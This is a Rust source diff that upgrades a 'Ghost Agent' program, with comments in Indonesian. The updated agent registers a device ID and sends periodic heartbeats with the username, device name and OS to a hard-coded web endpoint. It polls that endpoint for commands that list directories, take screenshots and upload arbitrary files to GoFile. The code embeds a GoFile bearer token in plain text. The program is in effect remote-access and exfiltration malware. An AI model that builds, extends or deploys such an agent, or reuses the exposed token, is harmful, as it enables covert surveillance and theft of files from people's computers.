@@ -1,143 +1,295 @@
-use std::time::Duration;
+use std::fs;
+use std::io::Write;
 use std::path::Path;
+use std::time::Duration;
 use tokio::time::sleep;
-use tokio::fs::File;
-use tokio_util::codec::{BytesCodec, FramedRead};
+use serde::{Deserialize, Serialize};
+use sysinfo::{System, SystemExt}; // SystemExt dibutuhkan di sysinfo 0.29
 use reqwest::Client;
-use serde::Deserialize;
-use serde_json::json;
+use screenshots::Screen;
+use uuid::Uuid;
+use base64::{Engine as _, engine::general_purpose}; // Fix base64 deprecated
 
-// --- KONFIGURASI ---
-const API_URL: &str = "https://erzysh.vercel.app/api/ghost"; 
-const GOFILE_TOKEN: &str = "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy"; 
-
-// --- STRUCT RESPONSE ---
-#[derive(Deserialize, Debug)]
-struct GoFileUploadResponse {
-    status: String,
-    data: Option<UploadData>,
+// --- CONFIGURATION STRUCT ---
+// Fix: Tambahkan 'Serialize' agar bisa disimpan kembali ke JSON
+#[derive(Serialize, Deserialize, Clone)]
+struct Config {
+    api_url: String,
+    device_name: String,
+    heartbeat_interval_ms: u64,
+    poll_interval_ms: u64,
+    gofile_token: String,
+    #[serde(default = "default_uuid")]
+    device_id: String,
 }
 
-#[derive(Deserialize, Debug)]
-struct UploadData {
-    #[serde(rename = "downloadPage")]
-    download_page: String,
+fn default_uuid() -> String {
+    Uuid::new_v4().to_string()
+}
+
+// --- PAYLOAD STRUCTS ---
+#[derive(Serialize)]
+struct HeartbeatPayload {
+    action: String,
+    device_id: String,
+    device_name: String,
+    ram_usage: u64, // in MB
+    ram_total: u64, // in MB
+    platform: String,
+    user: String,
+}
+
+#[derive(Serialize)]
+struct CommandResponse {
+    action: String,
+    device_id: String,
+    reply_to_id: String,
+    status: String,
+    data: Option<serde_json::Value>,
 }
 
 #[derive(Deserialize)]
-struct CommandResponse {
-    #[serde(rename = "messageId")]
-    message_id: Option<String>,
-    command: Option<String>,
+struct PendingCommand {
+    messageId: String,
+    command: String,
+    args: Option<String>,
 }
+
+#[derive(Serialize)]
+struct FileEntry {
+    name: String,
+    kind: String,
+    size: String,
+}
+
+// --- MAIN LOGIC ---
 
 #[tokio::main]
 async fn main() {
-    println!("👻 Ghost Agent Active (GoFile Singapore Node)...");
-    
-    // User-Agent Chrome
-    let client = Client::builder()
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-        .build()
-        .unwrap();
+    println!("👻 Ghost Agent v2.0 - Active...");
 
+    let mut config = load_or_create_config();
+    println!("📱 Device ID: {}", config.device_id);
+    
+    let client = Client::builder().build().unwrap();
+
+    // 2. Spawn Heartbeat Task
+    let hb_config = config.clone();
+    let hb_client = client.clone();
+    
+    tokio::spawn(async move {
+        // Inisialisasi System object sekali saja
+        let mut sys = System::new_all();
+        loop {
+            // Refresh specific data
+            sys.refresh_memory();
+            
+            // Fix: sysinfo 0.29 uses methods on the instance, need SystemExt trait
+            let payload = HeartbeatPayload {
+                action: "heartbeat".to_string(),
+                device_id: hb_config.device_id.clone(),
+                device_name: hb_config.device_name.clone(),
+                ram_usage: sys.used_memory() / 1024 / 1024,
+                ram_total: sys.total_memory() / 1024 / 1024,
+                platform: format!("{} {}", sys.name().unwrap_or_default(), sys.os_version().unwrap_or_default()),
+                user: whoami::username(),
+            };
+
+            let _ = hb_client.post(&hb_config.api_url).json(&payload).send().await;
+            sleep(Duration::from_millis(hb_config.heartbeat_interval_ms)).await;
+        }
+    });
+
+    // 3. Command Polling Loop
     loop {
-        match fetch_command(&client).await {
-            Ok(Some((msg_id, cmd))) => {
-                println!("📩 Perintah: {}", cmd);
-                if cmd.starts_with("GET_FILE:") {
-                    let path = cmd.trim_start_matches("GET_FILE:");
-                    handle_file_request(&client, path, &msg_id).await;
-                }
+        match fetch_command(&client, &config).await {
+            Ok(Some(cmd)) => {
+                println!("📩 Command: {} Args: {:?}", cmd.command, cmd.args);
+                process_command(&client, &config, cmd).await;
             }
-            Err(e) => println!("⚠️ Fetch error: {}", e),
+            Err(e) => println!("⚠️ Poll Error: {}", e),
             _ => {}
         }
-        sleep(Duration::from_secs(3)).await;
+        sleep(Duration::from_millis(config.poll_interval_ms)).await;
     }
 }
 
-async fn fetch_command(client: &Client) -> Result<Option<(String, String)>, Box<dyn std::error::Error>> {
-    let resp = client.get(API_URL).send().await?;
+// --- UTILS ---
+
+fn load_or_create_config() -> Config {
+    let path = "config.json";
+    if Path::new(path).exists() {
+        let content = fs::read_to_string(path).unwrap();
+        let mut cfg: Config = serde_json::from_str(&content).unwrap_or_else(|_| {
+            println!("⚠️ Config rusak, reset...");
+            create_default_config(path)
+        });
+        
+        if cfg.device_id.is_empty() {
+            cfg.device_id = Uuid::new_v4().to_string();
+            save_config(path, &cfg);
+        }
+        return cfg;
+    } 
+    create_default_config(path)
+}
+
+fn create_default_config(path: &str) -> Config {
+    let username = whoami::username();
+    let devicename = whoami::devicename();
+    
+    let default_cfg = Config {
+        api_url: "https://erzysh.vercel.app/api/ghost".to_string(),
+        device_name: format!("{}-{}", username, devicename),
+        heartbeat_interval_ms: 5000,
+        poll_interval_ms: 2000,
+        gofile_token: "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy".to_string(),
+        device_id: Uuid::new_v4().to_string(),
+    };
+
+    save_config(path, &default_cfg);
+    default_cfg
+}
+
+fn save_config(path: &str, config: &Config) {
+    let json = serde_json::to_string_pretty(config).unwrap();
+    let mut file = fs::File::create(path).expect("Gagal membuat file config");
+    file.write_all(json.as_bytes()).expect("Gagal menulis config");
+}
+
+async fn fetch_command(client: &Client, config: &Config) -> Result<Option<PendingCommand>, Box<dyn std::error::Error>> {
+    let url = format!("{}?deviceId={}", config.api_url, config.device_id);
+    let resp = client.get(&url).send().await?;
+    
     if resp.status().is_success() {
         let text = resp.text().await?;
         if text.trim().is_empty() || text == "null" { return Ok(None); }
-        
-        if let Ok(data) = serde_json::from_str::<CommandResponse>(&text) {
-            if let (Some(mid), Some(cmd)) = (data.message_id, data.command) {
-                return Ok(Some((mid, cmd)));
-            }
+        if let Ok(cmd) = serde_json::from_str::<PendingCommand>(&text) {
+            return Ok(Some(cmd));
         }
     }
     Ok(None)
 }
 
-async fn handle_file_request(client: &Client, path_str: &str, msg_id: &str) {
-    let path = Path::new(path_str);
-    if !path.exists() {
-        let err = format!("❌ File gak ketemu: {}", path_str);
-        println!("{}", err);
-        report_result(client, msg_id, &err).await;
-        return;
-    }
+async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) {
+    let mut response_data: Option<serde_json::Value> = None;
+    let mut status = "DONE".to_string();
 
-    println!("🚀 Uploading ke Singapore Server...");
-    match upload_to_gofile(client, path_str).await {
-        Ok(url) => {
-            println!("✅ Sukses! Link: {}", url);
-            report_result(client, msg_id, &url).await;
+    match cmd.command.as_str() {
+        "LS" => {
+            let path_str = cmd.args.unwrap_or_else(|| "C:\\".to_string());
+            match fs::read_dir(&path_str) {
+                Ok(entries) => {
+                    let mut files: Vec<FileEntry> = Vec::new();
+                    for entry in entries {
+                        if let Ok(entry) = entry {
+                            let meta = entry.metadata().unwrap();
+                            files.push(FileEntry {
+                                name: entry.file_name().to_string_lossy().to_string(),
+                                kind: if meta.is_dir() { "dir".to_string() } else { "file".to_string() },
+                                size: if meta.is_dir() { "-".to_string() } else { format_size(meta.len()) }
+                            });
+                        }
+                    }
+                    files.sort_by(|a, b| {
+                        if a.kind == b.kind { a.name.cmp(&b.name) } 
+                        else if a.kind == "dir" { std::cmp::Ordering::Less } 
+                        else { std::cmp::Ordering::Greater }
+                    });
+                    response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
+                }
+                Err(e) => {
+                    status = "ERROR".to_string();
+                    response_data = Some(serde_json::json!({ "message": e.to_string() }));
+                }
+            }
         },
-        Err(e) => {
-            // Print error raw biar ketahuan
-            let err = format!("❌ Upload Gagal: {}", e);
-            println!("{}", err);
-            report_result(client, msg_id, &err).await;
+        "SCREENSHOT" => {
+            let screens = Screen::all().unwrap_or_default();
+            if let Some(screen) = screens.first() {
+                match screen.capture() {
+                    Ok(image) => {
+                        // Fix: Menggunakan cursor dan crate image untuk write ke buffer PNG
+                        let mut cursor = std::io::Cursor::new(Vec::new());
+                        // ImageOutputFormat perlu 'image' crate
+                        let _ = image.write_to(&mut cursor, image::ImageOutputFormat::Png);
+                        
+                        // Fix: Menggunakan base64 engine baru
+                        let b64 = general_purpose::STANDARD.encode(cursor.get_ref());
+                        response_data = Some(serde_json::json!({ "image": b64 }));
+                    },
+                    Err(e) => {
+                        status = "ERROR".to_string();
+                        response_data = Some(serde_json::json!({ "message": e.to_string() }));
+                    }
+                }
+            }
+        },
+        "GET_FILE" => {
+            let path_str = cmd.args.unwrap_or_default();
+            match upload_to_gofile(client, &path_str, &config.gofile_token).await {
+                Ok(url) => response_data = Some(serde_json::json!({ "url": url })),
+                Err(e) => {
+                    status = "ERROR".to_string();
+                    response_data = Some(serde_json::json!({ "message": e.to_string() }));
+                }
+            }
+        },
+        _ => {
+            status = "ERROR".to_string();
+            response_data = Some(serde_json::json!({ "message": "Unknown command" }));
         }
     }
+
+    let payload = CommandResponse {
+        action: "response".to_string(),
+        device_id: config.device_id.clone(),
+        reply_to_id: cmd.messageId,
+        status,
+        data: response_data,
+    };
+
+    let _ = client.post(&config.api_url).json(&payload).send().await;
 }
 
-async fn upload_to_gofile(client: &Client, file_path: &str) -> Result<String, Box<dyn std::error::Error>> {
-    // URL Sesuai Dokumentasi (Regional Singapore)
-    let upload_url = "https://upload-ap-sgp.gofile.io/uploadFile";
+fn format_size(bytes: u64) -> String {
+    const UNITS: [&str; 4] = ["B", "KB", "MB", "GB"];
+    let mut b = bytes as f64;
+    let mut i = 0;
+    while b >= 1024.0 && i < UNITS.len() - 1 {
+        b /= 1024.0;
+        i += 1;
+    }
+    format!("{:.2} {}", b, UNITS[i])
+}
+
+async fn upload_to_gofile(client: &Client, file_path: &str, token: &str) -> Result<String, Box<dyn std::error::Error>> {
+    // Fix: tokio_util sekarang sudah diimport di Cargo.toml
+    use tokio_util::codec::{BytesCodec, FramedRead};
+    use tokio::fs::File;
     
+    let path = Path::new(file_path);
+    if !path.exists() { return Err("File not found".into()); }
+
     let file = File::open(file_path).await?;
     let stream = FramedRead::new(file, BytesCodec::new());
     let file_body = reqwest::Body::wrap_stream(stream);
-    let filename = Path::new(file_path).file_name().unwrap().to_string_lossy().to_string();
+    let filename = path.file_name().unwrap().to_string_lossy().to_string();
 
-    // Form data hanya butuh file, token ditaruh di HEADER sesuai docs baru
     let form = reqwest::multipart::Form::new()
         .part("file", reqwest::multipart::Part::stream(file_body).file_name(filename));
 
-    let upload_resp = client.post(upload_url)
-        .header("Authorization", format!("Bearer {}", GOFILE_TOKEN)) // <--- PENTING
+    let upload_resp = client.post("https://upload-ap-sgp.gofile.io/uploadFile")
+        .header("Authorization", format!("Bearer {}", token))
         .multipart(form)
         .send()
         .await?;
 
-    let raw_upload_body = upload_resp.text().await?;
+    let json: serde_json::Value = upload_resp.json().await?;
     
-    // Debugging: uncomment kalau mau liat respon asli
-    // println!("Raw Response: {}", raw_upload_body);
-
-    let upload_json: GoFileUploadResponse = serde_json::from_str(&raw_upload_body)
-        .map_err(|e| format!("Parsing Error. Server jawab: {}", raw_upload_body))?;
-
-    if upload_json.status == "ok" {
-        if let Some(data) = upload_json.data {
-            return Ok(data.download_page);
-        }
+    if json["status"].as_str().unwrap_or("") == "ok" {
+        Ok(json["data"]["downloadPage"].as_str().unwrap_or("").to_string())
+    } else {
+        Err(format!("Gofile error: {:?}", json).into())
     }
-
-    Err(format!("Status not ok: {}", raw_upload_body).into())
-}
-
-async fn report_result(client: &Client, reply_to_id: &str, data: &str) {
-    let _ = client.post(API_URL)
-        .json(&json!({
-            "action": "report_result",
-            "replyToId": reply_to_id,
-            "data": data
-        }))
-        .send().await;
 }
